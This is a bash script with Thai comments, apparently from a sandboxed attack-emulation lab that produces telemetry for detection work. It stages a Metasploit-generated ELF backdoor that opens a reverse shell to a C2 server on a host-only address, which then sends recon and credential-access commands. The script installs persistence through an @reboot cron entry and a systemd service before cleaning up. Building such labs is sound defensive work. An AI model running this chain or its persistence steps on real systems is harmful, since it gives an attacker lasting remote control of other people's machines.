#!/usr/bin/env bash
# trojan_real.sh - backdoor/RAT พฤติกรรมจริงด้วย msfvenom reverse-shell payload
#
# ต่างจาก trojan.sh (ART): ตัวนี้รัน ELF backdoor จริงจาก Metasploit framework
#   - reverse shell connect กลับ C2 (host-only 4444) - ไม่ออกเน็ต
#   - attacker (c2_server.py) ส่งคำสั่ง recon/credential access เข้ามา
#   - persist ผ่าน cron + systemd
# payload เป็น static ELF (generate ครั้งเดียว เก็บที่ host/payloads/) - VM ไม่ต้องมี msf
#
# labeling: payload + activity อยู่ใน $SANDBOX (seed) -> lineage จับ
#
# ATT&CK:
#   T1071.001  Application Layer Protocol (C2 channel)
#   T1059.004  Unix Shell (reverse shell execution)
#   T1005 / T1003  Data from Local System / Credential Access (attacker commands)
#   T1053.003  Cron persistence
#   T1543.002  Systemd service persistence
#
# ⚠️ backdoor ต่อเฉพาะ C2 host-only ของเรา ไม่ spread ไม่ออกเน็ต - revert หลังจบ
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
banner "trojan_real"
setup_sandbox

C2_HOST="${C2_HOST:-192.168.56.1}"
C2_PORT="${C2_PORT:-4444}"
TRJ="$SANDBOX/trojan"
mkdir -p "$TRJ"

# --- Stage 1: recon ก่อน (attacker/malware สำรวจก่อน) ---
atomic T1082 3,4
atomic T1033 2

# --- Stage 2: วาง backdoor payload (T1105 - จำลอง dropper) ---
# payload generate จาก msfvenom เก็บที่ host/payloads/ -> sync มาที่ /vagrant
echo "[trojan_real] วาง backdoor payload"
PAYLOAD_SRC="/vagrant/host/payloads/backdoor.elf"
if [ -f "$PAYLOAD_SRC" ]; then
    cp "$PAYLOAD_SRC" "$TRJ/backdoor"
    chmod +x "$TRJ/backdoor"
else
    echo "[!] ไม่พบ $PAYLOAD_SRC - generate ด้วย msfvenom ก่อน (ดู RUNBOOK)"
    done_banner "trojan_real"
    exit 0
fi

# --- Stage 3: รัน backdoor -> reverse shell กลับ C2 ---
# รันแบบ background ให้ scenario เดินต่อ, C2 (c2_server.py) จะ interact ให้
echo "[trojan_real] รัน backdoor -> C2 $C2_HOST:$C2_PORT"
"$TRJ/backdoor" &
BD_PID=$!
sleep 32   # ให้ C2 ส่งชุดคำสั่ง 14 ตัวเข้ามาครบก่อน (~0.5s/คำสั่ง + recv)

# --- Stage 4: persistence 2 ช่องทาง (malware ตั้งให้ตัวเองกลับมา) ---
# cron
(crontab -l 2>/dev/null; echo "@reboot $TRJ/backdoor") | crontab - 2>/dev/null || true
# systemd service
cat > "$TRJ/backdoor.service" <<UNIT
[Unit]
Description=System Backdoor (LAB SIM)
[Service]
ExecStart=$TRJ/backdoor
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
cp "$TRJ/backdoor.service" /etc/systemd/system/ 2>/dev/null || true
systemctl daemon-reload 2>/dev/null || true

# --- Stage 5: รอ backdoor ทำงานจนจบ session ---
wait "$BD_PID" 2>/dev/null || true
sleep 2

# --- cleanup (revert ก็ล้าง แต่กันไว้ระหว่างรอบ) ---
crontab -r 2>/dev/null || true
rm -f /etc/systemd/system/backdoor.service 2>/dev/null || true
systemctl daemon-reload 2>/dev/null || true
pkill -f "$TRJ/backdoor" 2>/dev/null || true

done_banner "trojan_real"
